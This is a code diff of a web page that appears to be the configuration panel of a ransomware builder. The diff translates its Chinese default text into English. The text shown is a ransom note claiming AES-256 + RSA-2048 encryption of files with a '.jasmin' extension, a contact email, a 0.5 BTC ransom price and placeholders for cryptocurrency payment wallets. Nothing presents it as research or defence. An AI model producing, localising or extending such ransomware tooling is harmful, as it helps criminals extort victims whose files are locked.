@@ -142,17 +142,17 @@ $__kfiles = [
 <h3 style="color:var(--accent2);font-size:.9rem;margin-bottom:12px"><i class="fas fa-scroll"></i> 勒索信配置</h3>
 <div class="gen-opts" style="grid-template-columns:1fr 1fr">
   <div class="field"><label>勒索标题</label><input type="text" id="ransom-title" value="YOUR FILES HAVE BEEN ENCRYPTED"></div>
-  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="Contact: jasmin@protonmail.com" placeholder="邮箱/Telegram/Bitcoin地址"></div>
+  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="Contact: jasmin@protonmail.com" placeholder="Email / Telegram / Bitcoin address"></div>
 </div>
 <div class="field" style="margin-bottom:14px"><label>勒索信正文 (支持多行)</label>
-<textarea id="ransom-body" rows="4" style="width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.84rem;resize:vertical;font-family:monospace">所有文件已使用 AES-256 + RSA-2048 军事级加密。
-每个文件拥有独立密钥，由RSA公钥保护。
-不要重命名/删除 .jasmin 文件，不要用第三方软件解密。
-联系我们获取私钥以解密文件。</textarea>
+<textarea id="ransom-body" rows="4" style="width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.84rem;resize:vertical;font-family:monospace">All your files have been encrypted with AES-256 + RSA-2048 military-grade encryption.
+Each file has its own unique key, protected by an RSA public key.
+Do NOT rename or delete .jasmin files. Do NOT use third-party recovery tools.
+Contact us to obtain the private key and restore your files.</textarea>
 </div>
 <div class="gen-opts" style="grid-template-columns:1fr 1fr">
-  <div class="field"><label>赎金金额</label><input type="text" id="ransom-price" value="0.5 BTC" placeholder="如: 0.5 BTC / $5000 USDT"></div>
-  <div class="field"><label>支付地址</label><input type="text" id="ransom-wallet" value="" placeholder="BTC/ETH/USDT地址"></div>
+  <div class="field"><label>赎金金额</label><input type="text" id="ransom-price" value="0.5 BTC" placeholder="e.g. 0.5 BTC / $5000 USDT"></div>
+  <div class="field"><label>支付地址</label><input type="text" id="ransom-wallet" value="" placeholder="BTC / ETH / USDT address"></div>
 </div>
 
 <div style="display:flex;gap:10px;margin-top:16px">
